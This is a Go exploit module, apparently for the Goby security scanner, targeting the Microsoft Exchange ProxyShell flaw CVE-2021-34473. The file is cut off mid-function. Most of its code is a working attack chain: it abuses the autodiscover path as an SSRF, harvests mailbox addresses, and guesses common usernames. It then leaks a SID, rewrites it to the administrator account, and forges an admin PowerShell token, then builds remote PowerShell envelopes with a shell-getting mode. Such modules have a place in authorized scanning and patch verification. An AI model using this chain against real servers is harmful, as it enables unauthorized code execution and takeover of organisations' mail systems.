package exploits

import (
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"io"
	"regexp"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Microsoft Exchange Server Remote Code Execution Vulnerability (CVE-2021-34473)",
    "Description": "Microsoft Exchange Server Remote Code Execution Vulnerability This CVE ID is unique from CVE-2021-31196, CVE-2021-31206.",
    "Impact": "Microsoft Exchange Server Remote Code Execution Vulnerability (CVE-2021-34473)",
    "Recommendation": "Users can refer to the security bulletins provided by the following vendors to obtain patch information: https://msrc.microsoft.com/update-guide/en-US/vulnerability/",
    "Product": "Microsoft-Exchange-Server",
    "VulType": [
        "Code Execution"
    ],
    "Tags": [
        "Code Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "Microsoft Exchange Server 远程代码执行漏洞（CVE-2021-34473）",
            "Description": "<p>Microsoft Exchange Server是Microsoft开发的邮件服务器和日历服务器。</p><p>Microsoft Exchange Server存在远程代码执行漏洞。攻击者可利用该漏洞实现远程代码执行。</p>",
            "Impact": "<p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">Microsoft Exchange Server存在远程代码执行漏洞。攻击者可利用该漏洞实现远程代码执行。</span><br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新： <a href=\"https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-34473\" target=\"_blank\">https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-34473</a></p>",
            "Product": "Microsoft Exchange Server",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Microsoft Exchange Server Remote Code Execution Vulnerability (CVE-2021-34473)",
            "Description": "Microsoft Exchange Server Remote Code Execution Vulnerability This CVE ID is unique from CVE-2021-31196, CVE-2021-31206.",
            "Impact": "Microsoft Exchange Server Remote Code Execution Vulnerability (CVE-2021-34473)",
            "Recommendation": "Users can refer to the security bulletins provided by the following vendors to obtain patch information: https://msrc.microsoft.com/update-guide/en-US/vulnerability/",
            "Product": "Microsoft-Exchange-Server",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "FofaQuery": "(body=\"href=\\\"/owa/auth/15.1.2176\") || (body=\"href=\\\"/owa/auth/15.1.544\") || (body=\"href=\\\"/owa/auth/15.1.1713\") || (body=\"href=\\\"/owa/auth/15.1.225\") || (body=\"href=\\\"/owa/auth/15.1.1261\") || (body=\"href=\\\"/owa/auth/15.1.2044\") || (body=\"href=\\\"/owa/auth/15.1.466\") || (body=\"href=\\\"/owa/auth/15.1.396\") || (body=\"href=\\\"/owa/auth/15.1.1847\") || (body=\"href=\\\"/owa/auth/15.1.845\") || (body=\"href=\\\"/owa/auth/15.1.1591\") || (body=\"href=\\\"/owa/auth/15.1.1466\") || (body=\"href=\\\"/owa/auth/15.1.1979\") || (body=\"href=\\\"/owa/auth/15.1.1531\") || (body=\"href=\\\"/owa/auth/15.1.1034\") || (body=\"href=\\\"/owa/auth/15.1.1779\") || (body=\"href=\\\"/owa/auth/15.1.2106\") || (body=\"href=\\\"/owa/auth/15.1.1415\") || (body=\"href=\\\"/owa/auth/15.1.669\") || (banner=\"Microsoft Exchange 2016 POP3 server\")",
    "GobyQuery": "(body=\"href=\\\"/owa/auth/15.1.2176\") || (body=\"href=\\\"/owa/auth/15.1.544\") || (body=\"href=\\\"/owa/auth/15.1.1713\") || (body=\"href=\\\"/owa/auth/15.1.225\") || (body=\"href=\\\"/owa/auth/15.1.1261\") || (body=\"href=\\\"/owa/auth/15.1.2044\") || (body=\"href=\\\"/owa/auth/15.1.466\") || (body=\"href=\\\"/owa/auth/15.1.396\") || (body=\"href=\\\"/owa/auth/15.1.1847\") || (body=\"href=\\\"/owa/auth/15.1.845\") || (body=\"href=\\\"/owa/auth/15.1.1591\") || (body=\"href=\\\"/owa/auth/15.1.1466\") || (body=\"href=\\\"/owa/auth/15.1.1979\") || (body=\"href=\\\"/owa/auth/15.1.1531\") || (body=\"href=\\\"/owa/auth/15.1.1034\") || (body=\"href=\\\"/owa/auth/15.1.1779\") || (body=\"href=\\\"/owa/auth/15.1.2106\") || (body=\"href=\\\"/owa/auth/15.1.1415\") || (body=\"href=\\\"/owa/auth/15.1.669\") || (banner=\"Microsoft Exchange 2016 POP3 server\")",
    "Author": "go0p",
    "Homepage": "https://msrc.microsoft.com",
    "DisclosureDate": "2021-07-14",
    "References": [
        "https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-34473"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [
        "CVE-2021-34473"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-202107-741"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "Mode",
            "type": "select",
            "value": "GetShell,Exec_Ps",
            "show": ""
        },
        {
            "name": "Exec",
            "type": "input",
            "value": "Get-User",
            "show": "Mode=Exec_Ps"
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [
            "Microsoft-Exchange"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10755"
}`

	const (
		NS_ADDRESSING        = "http://schemas.xmlsoap.org/ws/2004/08/addressing"
		NS_CIMBINDING        = "http://schemas.dmtf.org/wbem/wsman/1/cimbinding.xsd"
		NS_ENUM              = "http://schemas.xmlsoap.org/ws/2004/09/enumeration"
		NS_SCHEMA            = "http://www.w3.org/2001/XMLSchema"
		NS_SCHEMA_INST       = "http://www.w3.org/2001/XMLSchema-instance"
		NS_SOAP_ENV          = "http://www.w3.org/2003/05/soap-envelope"
		NS_TRANSFER          = "http://schemas.xmlsoap.org/ws/2004/09/transfer"
		NS_WIN_SHELL         = "http://schemas.microsoft.com/wbem/wsman/1/windows/shell"
		NS_WSMAN_CONF        = "http://schemas.microsoft.com/wbem/wsman/1/config"
		NS_WSMAN_DMTF        = "http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"
		NS_WSMAN_MSFT        = "http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"
		NS_WSMAN_FAULT       = "http://schemas.microsoft.com/wbem/wsman/1/wsmanfault"
		NS_EVENTING          = "http://schemas.xmlsoap.org/ws/2004/08/eventing"
		NS_EVENTLOG          = "http://schemas.microsoft.com/wbem/wsman/1/windows/EventLog"
		NS_SUBSCRIPTION      = "http://schemas.microsoft.com/wbem/wsman/1/SubscriptionManager/Subscription"
		NS_WMI               = "http://schemas.microsoft.com/wbem/wsman/1/wmi"
		NS_WMI_CIMV2         = "http://schemas.microsoft.com/wbem/wsman/1/wmi/root/cimv2"
		NS_WMI_STANDARDCIMV2 = "http://schemas.microsoft.com/wbem/wsman/1/wmi/root/standardcimv2"
		NS_CIMV2             = "http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2"
		NS_WINDOWS           = "http://schemas.microsoft.com/wbem/wsman/1/windows"
		NS_WMI_HARDWARE      = "http://schemas.microsoft.com/wbem/wsman/1/wmi/root/hardware"
	)
	Uuid := func() string {
		b := make([]byte, 16)
		_, err := io.ReadFull(rand.Reader, b)
		if err != nil {
			panic("create uuid failed, " + err.Error())
		}
		uuid := fmt.Sprintf("%x-%x-%x-%x-%x", b[0:4], b[4:6], b[6:8], b[8:10], b[10:])
		return strings.ToUpper(uuid)
	}
	var SessionId = Uuid()
	var ShellId = Uuid()
	const ShellEncode = "ldZUhrdpFDnNqQbf96nf2v+CYWdUhrdpFII5hvcGqRT/gtbahqXahoI5uanf2jmp1mlU041pqRT/FIb32tld9wZUFLfTBjm5qd/aKSDTqQ2MyenapanNjL7aXPfa1hR+gsB1dcCCD2uC9wbWqV3agskxIZX71lSGt2kU2Q=="

	getFqdn := func(hostinfo *httpclient.FixUrl, fakeEmail string) string {
		var sign = []string{"/ews/exchange.asmx", "/owa", "/ecp"}
		for _, v := range sign {
			path :=
				fmt.Sprintf("/autodiscover/autodiscover.json?%s%s?&Email=autodiscover/autodiscover.json%%3F%s", fakeEmail, v, fakeEmail)
			cfg := httpclient.NewGetRequestConfig(path)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(hostinfo, cfg); err == nil {
				if len(resp.Header.Get("X-CalculatedBETarget")) != 0 {
					localDomain := resp.Header.Get("X-CalculatedBETarget")
					return strings.SplitN(localDomain, ".", 2)[1]
				}
			}
		}
		return ""
	}
	getFakeEmail := func() string {
		user := goutils.RandomHexString(5)
		domain := goutils.RandomHexString(5)
		com := goutils.RandomHexString(3)
		fakeEmail := user + "@" + domain + "." + com
		return fakeEmail
	}
	getEmailList := func(hostinfo *httpclient.FixUrl, fakeEmail string) []string {
		path := fmt.Sprintf("/autodiscover/autodiscover.json?%s/EWS/exchange.asmx?=&Email=autodiscover/autodiscover.json%%3f%s", fakeEmail, fakeEmail)
		cfg := httpclient.NewPostRequestConfig(path)
		cfg.VerifyTls = false
		cfg.Timeout = 30
		cfg.Header.Store("Content-Type", "text/xml")
		cfg.FollowRedirect = false
		cfg.Data = "<soap:Envelope\r\n      xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\r\n      xmlns:m=\"http://schemas.microsoft.com/exchange/services/2006/messages\"\r\n      xmlns:t=\"http://schemas.microsoft.com/exchange/services/2006/types\"\r\n      xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\r\n     <soap:Body>\r\n        <m:ResolveNames ReturnFullContactData=\"true\" SearchScope=\"ActiveDirectory\">\r\n          <m:UnresolvedEntry>SMTP:</m:UnresolvedEntry>\r\n        </m:ResolveNames>\r\n      </soap:Body>\r\n    </soap:Envelope>"
		if resp, err := httpclient.DoHttpRequest(hostinfo, cfg); err == nil && resp.StatusCode == 200 {
			resEmailListList := regexp.MustCompile(`(?s)(?:<t:EmailAddress>)(.+?)(?:</t:EmailAddress>)`).FindAllStringSubmatch(resp.RawBody, -1)
			var resEmailList []string
			for i, _ := range resEmailListList {
				resEmailList = append(resEmailList, resEmailListList[i][1])
			}
			return resEmailList
		}
		return nil
	}
	getLegacydn := func(hostinfo *httpclient.FixUrl, fakeEmail string, Fqdn string) (email string, LegacyDN string) {
		path := fmt.Sprintf("/autodiscover/autodiscover.json?%s/autodiscover/autodiscover.xml?=&Email=autodiscover/autodiscover.json%%3f%s", fakeEmail, fakeEmail)
		cfg := httpclient.NewPostRequestConfig(path)
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		cfg.Header.Store("Content-Type", "text/xml")
		emailArr := getEmailList(hostinfo, fakeEmail)
		for _, email := range emailArr {
			cfg.Data = fmt.Sprintf("<Autodiscover xmlns=\"http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006\"><Request><EMailAddress>%s</EMailAddress><AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema></Request></Autodiscover>", email)
			if resp, err := httpclient.DoHttpRequest(hostinfo, cfg); err == nil && strings.Contains(resp.RawBody, "<LegacyDN>") {
				Email := email
				legacyDN := regexp.MustCompile(`(?s)<LegacyDN>(.*?)</LegacyDN>`).FindStringSubmatch(resp.RawBody)[1]
				LegacyDN = legacyDN
				return Email, LegacyDN
			}
		}
		var users = []string{"administrator", "root", "sysadmin",
			"test", "webmaster", "support", "admin", "test2", "test1",
			"test01", "guest", "info", "noreply", "log", "no-reply",
			"sales", "contact"}
		for _, user := range users {
			email := user + "@" + Fqdn
			cfg.Data = fmt.Sprintf("<Autodiscover xmlns=\"http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006\"><Request><EMailAddress>%s</EMailAddress><AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema></Request></Autodiscover>", email)
			if resp, err := httpclient.DoHttpRequest(hostinfo, cfg); err == nil && strings.Contains(resp.RawBody, "<LegacyDN>") {
				Email := email
				legacyDN := regexp.MustCompile(`(?s)<LegacyDN>(.*?)</LegacyDN>`).FindStringSubmatch(resp.RawBody)[1]
				LegacyDN = legacyDN
				return Email, LegacyDN
			}
		}
		return "", ""
	}
	getSid := func(hostinfo *httpclient.FixUrl, LegacyDN string, fakeEmail string) string {
		data := LegacyDN
		data2 := "0000000000e404"
		data2 += "00000904000009"
		data2 += "04000000000000"
		strDatae, _ := hex.DecodeString(data2)
		data = data + string(strDatae)
		path := fmt.Sprintf("/autodiscover/autodiscover.json?%s/mapi/emsmdb/?=&Email=autodiscover/autodiscover.json%%3f%s", fakeEmail, fakeEmail)
		cfg := httpclient.NewPostRequestConfig(path)
		cfg.Header.Store("X-Requesttype", "Connect")
		cfg.Header.Store("Content-Type", "application/mapi-http")
		cfg.Header.Store("X-Clientinfo", "{2F94A2BF-A2E6-4CCCC-BF98-B5F22C542226}")
		cfg.Header.Store("X-Clientapplication", "Outlook/15.0.4815.1002")
		cfg.Header.Store("X-Requestid", "{C715155F-2BE8-44E0-BD34-2960067874C8}:500")
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		cfg.Data = data
		if resp, err := httpclient.DoHttpRequest(hostinfo, cfg); err == nil && strings.Contains(resp.RawBody, "SID") {
			sid := regexp.MustCompile(`(?s)with SID (.*?) and MasterAccountSid`).FindStringSubmatch(resp.RawBody)[1]
			ss := strings.Split(sid, "-")
			sid = strings.Replace(sid, ss[len(ss)-1], "500", -1)
			return sid
		}
		return ""
	}
	getToken := func(Email string, SID string) string {
		raw_token := []byte{}
		gsid := "S-1-5-32-544"
		versionData := "560100"
		typeData := "540757696e646f7773"
		compressData := "4300"
		authData := "41084b65726265726f73"
		header := versionData + typeData + compressData + authData
		headerByts, _ := hex.DecodeString(header)
		loginData := "4c" + fmt.Sprintf("%02x", len(Email)) + hex.EncodeToString([]byte(Email))
		loginDataByts, _ := hex.DecodeString(loginData)
		userData := "55" + fmt.Sprintf("%02x", len(SID)) + hex.EncodeToString([]byte(SID))
		userDataByts, _ := hex.DecodeString(userData)
		groupData := "47" + "0100000007000000" + fmt.Sprintf("%02x", len(gsid)) + hex.EncodeToString([]byte(gsid))
		groupDataByts, _ := hex.DecodeString(groupData)
		extData := "45" + "00000000"
		extDataByts, _ := hex.DecodeString(extData)
		raw_token = append(raw_token, headerByts...)
		raw_token = append(raw_token, loginDataByts...)
		raw_token = append(raw_token, userDataByts...)
		raw_token = append(raw_token, groupDataByts...)
		raw_token = append(raw_token, extDataByts...)
		token := base64.StdEncoding.EncodeToString(raw_token)
		return token
	}
	checkToken := func(hostinfo *httpclient.FixUrl, token string, fakeEmail string) bool {
		path := fmt.Sprintf("/autodiscover/autodiscover.json?%s/powershell/?X-Rps-CAT=%s&Email=autodiscover/autodiscover.json%%3F%s", fakeEmail, token, fakeEmail)
		cfg := httpclient.NewGetRequestConfig(path)
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		cfg.Header.Store("Cookie", "PrivateComputer=true; ClientID=C715155F2BE844E0-BD342960067874C8; X-OWA-JS-PSD=1")
		if resp, err := httpclient.DoHttpRequest(hostinfo, cfg); err == nil && resp.StatusCode == 200 {
			return true
		}
		return false
	}
	GetCreateShellXml := func(MessageId string, SessionId string, ShellId string, CreationXmlContent string) string {
		tpl := `<s:Envelope xmlns:s="` + NS_SOAP_ENV + `" xmlns:wsa="` + NS_ADDRESSING + `" xmlns:rsp="` + NS_WIN_SHELL + `" xmlns:wsman="` + NS_WSMAN_DMTF + `" xmlns:wsmv="` + NS_WSMAN_MSFT + `">
  <s:Header>
    <wsa:Action s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/09/transfer/Create</wsa:Action>
    <wsmv:DataLocale s:mustUnderstand="false" xml:lang="en-US"/>
    <wsman:Locale s:mustUnderstand="false" xml:lang="en-US"/>
    <wsman:MaxEnvelopeSize s:mustUnderstand="true">153600</wsman:MaxEnvelopeSize>
    <wsa:MessageID>uuid:` + MessageId + `</wsa:MessageID>
    <wsman:OperationTimeout>PT20S</wsman:OperationTimeout>
    <wsa:ReplyTo>
      <wsa:Address s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</wsa:Address>
    </wsa:ReplyTo>
    <wsman:ResourceURI>http://schemas.microsoft.com/powershell/Microsoft.Exchange</wsman:ResourceURI>
    <wsmv:SessionId s:mustUnderstand="false">uuid:` + SessionId + `</wsmv:SessionId>
    <wsa:To>http://127.0.0.1:80/powershell</wsa:To>
    <wsman:OptionSet s:mustUnderstand="true">
      <wsman:Option MustComply="true" Name="protocolversion">2.3</wsman:Option>
    </wsman:OptionSet>
  </s:Header>
  <s:Body>
    <rsp:Shell ShellId="` + ShellId + `">
      <rsp:InputStreams>stdin pr</rsp:InputStreams>
      <rsp:OutputStreams>stdout</rsp:OutputStreams>
      <creationXml xmlns="http://schemas.microsoft.com/powershell">` + CreationXmlContent + `</creationXml>
    </rsp:Shell>
  </s:Body>
</s:Envelope>
	}`
		return strings.ReplaceAll(tpl, "\n", "\r\n")
	}
	GetDeleteShellXml := func(MessageId string, SessionId string, ShellId string) string {
		tpl := `<s:Envelope xmlns:s="` + NS_SOAP_ENV + `" xmlns:wsa="` + NS_ADDRESSING + `" xmlns:rsp="` + NS_WIN_SHELL + `" xmlns:wsman="` + NS_WSMAN_DMTF + `" xmlns:wsmv="` + NS_WSMAN_MSFT + `">
  <s:Header>
    <wsa:Action s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/09/transfer/Delete</wsa:Action>
    <wsmv:DataLocale s:mustUnderstand="false" xml:lang="en-US"/>
    <wsman:Locale s:mustUnderstand="false" xml:lang="en-US"/>
    <wsman:MaxEnvelopeSize s:mustUnderstand="true">512000</wsman:MaxEnvelopeSize>
    <wsa:MessageID>uuid:` + MessageId + `</wsa:MessageID>
    <wsman:OperationTimeout>PT20S</wsman:OperationTimeout>
    <wsa:ReplyTo>
      <wsa:Address s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</wsa:Address>
    </wsa:ReplyTo>
    <wsman:ResourceURI>http://schemas.microsoft.com/powershell/Microsoft.Exchange</wsman:ResourceURI>
    <wsmv:SessionId s:mustUnderstand="false">uuid:` + SessionId + `</wsmv:SessionId>
    <wsa:To>http://127.0.0.1:80/powershell</wsa:To>
    <wsman:SelectorSet>
      <wsman:Selector Name="ShellId">` + ShellId + `</wsman:Selector>
    </wsman:SelectorSet>
  </s:Header>
  <s:Body/>
</s:Envelope>`
		return strings.ReplaceAll(tpl, "\n", "\r\n")
	}
	GetReceiveXml := func(MessageId string, SessionId string, ShellId string, CommandId string, MaxSize string) string {
		if CommandId != "" {
			CommandId = fmt.Sprintf("CommandId=\"%s\"", CommandId)
		}
		tpl := `<s:Envelope xmlns:s="` + NS_SOAP_ENV + `" xmlns:wsa="` + NS_ADDRESSING + `" xmlns:rsp="` + NS_WIN_SHELL + `" xmlns:wsman="` + NS_WSMAN_DMTF + `" xmlns:wsmv="` + NS_WSMAN_MSFT + `">
  <s:Header>
    <wsa:Action s:mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Receive</wsa:Action>
    <wsmv:DataLocale s:mustUnderstand="false" xml:lang="en-US"/>
    <wsman:Locale s:mustUnderstand="false" xml:lang="en-US"/>
    <wsman:MaxEnvelopeSize s:mustUnderstand="true">` + MaxSize + `</wsman:MaxEnvelopeSize>
    <wsa:MessageID>uuid:` + MessageId + `</wsa:MessageID>
    <wsman:OperationTimeout>PT20S</wsman:OperationTimeout>
    <wsa:ReplyTo>
      <wsa:Address s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</wsa:Address>
    </wsa:ReplyTo>
    <wsman:ResourceURI>http://schemas.microsoft.com/powershell/Microsoft.Exchange</wsman:ResourceURI>
    <wsmv:SessionId s:mustUnderstand="false">uuid:` + SessionId + `</wsmv:SessionId>
    <wsa:To>http://127.0.0.1:80/powershell</wsa:To>
    <wsman:OptionSet s:mustUnderstand="true">
      <wsman:Option Name="WSMAN_CMDSHELL_OPTION_KEEPALIVE">True</wsman:Option>
    </wsman:OptionSet>
    <wsman:SelectorSet>
      <wsman:Selector Name="ShellId">` + ShellId + `</wsman:Selector>
    </wsman:SelectorSet>
  </s:Header>
  <s:Body>
    <rsp:Receive>
      <rsp:DesiredStream ` + CommandId + `>stdout</rsp:DesiredStream>
    </rsp:Receive>
  </s:Body>
</s:Envelope>`
		return strings.ReplaceAll(tpl, "\n", "\r\n")
	}
	GetCreateCommandXml := func(MessageId string, SessionId string, ShellId string, CommandId string, Arguments string) string {
		tpl := `<s:Envelope xmlns:s="` + NS_SOAP_ENV + `" xmlns:wsa="` + NS_ADDRESSING + `" xmlns:rsp="` + NS_WIN_SHELL + `" xmlns:wsman="` + NS_WSMAN_DMTF + `" xmlns:wsmv="` + NS_WSMAN_MSFT + `">
  <s:Header>
    <wsa:Action s:mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Command</wsa:Action>
    <wsmv:DataLocale s:mustUnderstand="false" xml:lang="en-US"/>
    <wsman:Locale s:mustUnderstand="false" xml:lang="en-US"/>
    <wsman:MaxEnvelopeSize s:mustUnderstand="true">512000</wsman:MaxEnvelopeSize>
    <wsa:MessageID>uuid:` + MessageId + `</wsa:MessageID>
    <wsman:OperationTimeout>PT20S</wsman:OperationTimeout>
    <wsa:ReplyTo>
      <wsa:Address s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</wsa:Address>
    </wsa:ReplyTo>
    <wsman:ResourceURI>http://schemas.microsoft.com/powershell/Microsoft.Exchange</wsman:ResourceURI>
    <wsmv:SessionId s:mustUnderstand="false">uuid:` + SessionId + `</wsmv:SessionId>
    <wsa:To>http://127.0.0.1:80/powershell</wsa:To>
    <wsman:OptionSet s:mustUnderstand="true">
      <wsman:Option Name="WINRS_SKIP_CMD_SHELL">False</wsman:Option>
    </wsman:OptionSet>
    <wsman:SelectorSet>
      <wsman:Selector Name="ShellId">` + ShellId + `</wsman:Selector>
    </wsman:SelectorSet>
  </s:Header>
  <s:Body>
    <rsp:CommandLine CommandId="` + CommandId + `">
      <rsp:Command/>
      <rsp:Arguments>` + Arguments + `</rsp:Arguments>
    </rsp:CommandLine>
  </s:Body>
</s:Envelope>`
		return strings.ReplaceAll(tpl, "\n", "\r\n")
	}
	getCreationXml := func() string {
		ObjectId := "0000000000000001"
		FragmentId := "0000000000000000"
		Reserved := "03"
		BlogLength := "000000C7"
		Destination := "02000000"
		MessageType := "02000100"
		hexHeader := ObjectId + FragmentId + Reserved + BlogLength + Destination + MessageType
		hexHeader += strings.ReplaceAll(ShellId, "-", "")
		PID := "00000000000000000000000000000000"
		Data1 := "3C4F626A2052656649643D2230223E3C4D533E3C56657273696F6E204E3D2270726F746F636F6C76657273696F6E223E322E333C2F56657273696F6E3E3C56657273696F6E204E3D22505356657273696F6E223E322E303C2F56657273696F6E3E3C56657273696F6E204E3D2253657269616C697A6174696F6E56657273696F6E223E312E312E302E313C2F56657273696F6E3E3C2F4D533E3C2F4F626A3E0000000000000002000000000000000003000002FD0200000004000100"
		Data2 := "3C4F626A2052656649643D2230223E3C4D533E3C493332204E3D224D696E52756E737061636573223E313C2F4933323E3C493332204E3D224D617852756E737061636573223E313C2F4933323E3C4F626A2052656649643D223122204E3D2250535468726561644F7074696F6E73223E3C544E2052656649643D2230223E3C543E53797374656D2E4D616E6167656D656E742E4175746F6D6174696F6E2E52756E7370616365732E50535468726561644F7074696F6E733C2F543E3C543E53797374656D2E456E756D3C2F543E3C543E53797374656D2E56616C7565547970653C2F543E3C543E53797374656D2E4F626A6563743C2F543E3C2F544E3E3C546F537472696E673E44656661756C743C2F546F537472696E673E3C4933323E303C2F4933323E3C2F4F626A3E3C4F626A2052656649643D223222204E3D2241706172746D656E745374617465223E3C544E2052656649643D2231223E3C543E53797374656D2E4D616E6167656D656E742E4175746F6D6174696F6E2E52756E7370616365732E41706172746D656E7453746174653C2F543E3C543E53797374656D2E456E756D3C2F543E3C543E53797374656D2E56616C7565547970653C2F543E3C543E53797374656D2E4F626A6563743C2F543E3C2F544E3E3C546F537472696E673E554E4B4E4F574E3C2F546F537472696E673E3C4933323E323C2F4933323E3C2F4F626A3E3C4F626A2052656649643D223322204E3D22486F7374496E666F223E3C4D533E3C42204E3D225F6973486F73744E756C6C223E747275653C2F423E3C42204E3D225F6973486F737455494E756C6C223E747275653C2F423E3C42204E3D225F6973486F737452617755494E756C6C223E747275653C2F423E3C42204E3D225F75736552756E7370616365486F7374223E747275653C2F423E3C2F4D533E3C2F4F626A3E3C4E696C204E3D224170706C69636174696F6E417267756D656E747322202F3E3C2F4D533E3C2F4F626A3E"
		hexHeader += PID
		hexHeader += Data1
		hexHeader += strings.ReplaceAll(ShellId, "-", "")
		hexHeader += PID
		hexHeader += Data2
		str, _ := hex.DecodeString(hexHeader)
		return base64.StdEncoding.EncodeToString(str)
	}
	getArgumentsCom := func(script string) string {
		hexHeader := "00000000000000030000000000000000030000"
		cmdHex := fmt.Sprintf("%04x", 2228+len(script))
		cmdHex += "0200000006100200"
		cmdHex += strings.ReplaceAll(ShellId, "-", "")
		cmdHex += "AFC1D2D78333964082547639AE5D4042"
		xmlObj := "<Obj RefId=\"0\"><MS><B N=\"NoInput\">true</B><Obj RefId=\"1\" N=\"ApartmentState\"><TN RefId=\"0\"><T>System.Management.Automation.Runspaces.ApartmentState</T><T>System.Enum</T><T>System.ValueType</T><T>System.Object</T></TN><ToString>UNKNOWN</ToString><I32>2</I32></Obj><Obj RefId=\"2\" N=\"RemoteStreamOptions\"><TN RefId=\"1\"><T>System.Management.Automation.Runspaces.RemoteStreamOptions</T><T>System.Enum</T><T>System.ValueType</T><T>System.Object</T></TN><ToString>AddInvocationInfo</ToString><I32>15</I32></Obj><B N=\"AddToHistory\">false</B><Obj RefId=\"3\" N=\"HostInfo\"><MS><B N=\"_isHostNull\">true</B><B N=\"_isHostUINull\">true</B><B N=\"_isHostRawUINull\">true</B><B N=\"_useRunspaceHost\">true</B></MS></Obj><Obj RefId=\"4\" N=\"PowerShell\"><MS><B N=\"IsNested\">false</B><Nil N=\"ExtraCmds\" /><Obj RefId=\"5\" N=\"Cmds\"><TN RefId=\"2\"><T>System.Collections.Generic.List`1[[System.Management.Automation.PSObject, System.Management.Automation, Version=1.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]]</T><T>System.Object</T></TN><LST><Obj RefId=\"6\"><MS><S N=\"Cmd\">" + script + "</S><B N=\"IsScript\">true</B><Nil N=\"UseLocalScope\" /><Obj RefId=\"7\" N=\"MergeMyResult\"><TN RefId=\"3\"><T>System.Management.Automation.Runspaces.PipelineResultTypes</T><T>System.Enum</T><T>System.ValueType</T><T>System.Object</T></TN><ToString>None</ToString><I32>0</I32></Obj><Obj RefId=\"8\" N=\"MergeToResult\"><TNRef RefId=\"3\" /><ToString>None</ToString><I32>0</I32></Obj><Obj RefId=\"9\" N=\"MergePreviousResults\"><TNRef RefId=\"3\" /><ToString>None</ToString><I32>0</I32></Obj><Obj RefId=\"10\" N=\"Args\"><TNRef RefId=\"2\" /><LST /></Obj><Obj RefId=\"11\" N=\"MergeError\"><TNRef RefId=\"3\" /><ToString>None</ToString><I32>0</I32></Obj><Obj RefId=\"12\" N=\"MergeWarning\"><TNRef RefId=\"3\" /><ToString>None</ToString><I32>0</I32></Obj><Obj RefId=\"13\" N=\"MergeVerbose\"><TNRef RefId=\"3\" /><ToString>None</ToString><I32>0</I32></Obj><Obj RefId=\"14\" N=\"MergeDebug\"><TNRef RefId=\"3\" /><ToString>None</ToString><I32>0</I32></Obj><Obj RefId=\"15\" N=\"MergeInformation\"><TNRef RefId=\"3\" /><ToString>None</ToString><I32>0</I32></Obj></MS></Obj></LST></Obj><Nil N=\"History\" /><B N=\"RedirectShellErrorOutputPipe\">false</B></MS></Obj><B N=\"IsNested\">false</B></MS></Obj>"
		allHex := hexHeader + cmdHex + hex.EncodeToString([]byte(xmlObj))
		strHex, _ := hex.DecodeString(allHex)
		return base64.StdEncoding.EncodeToString(strHex)
	}
	RegexpStdout := func(res string) string {
		stdoutB64 := regexp.MustCompile(`(?s)CommandId=.*?>(.*?)</rsp:Stream>`).FindAllStringSubmatch(res, -1)
		output2 := ""
		for i, _ := range stdoutB64 {
			stdoutStr, _ := base64.StdEncoding.DecodeString(stdoutB64[i][1])
			stdoutHex := hex.EncodeToString(stdoutStr)[128:]
			stdoutXml, _ := hex.DecodeString(stdoutHex)
			output := regexp.MustCompile(`<ToString>(.*?)</ToString>`).FindAllStringSubmatch(string(stdoutXml), -1)
			for i2, _ := range output {
				output2 += output[i2][1] + "\n"
			}
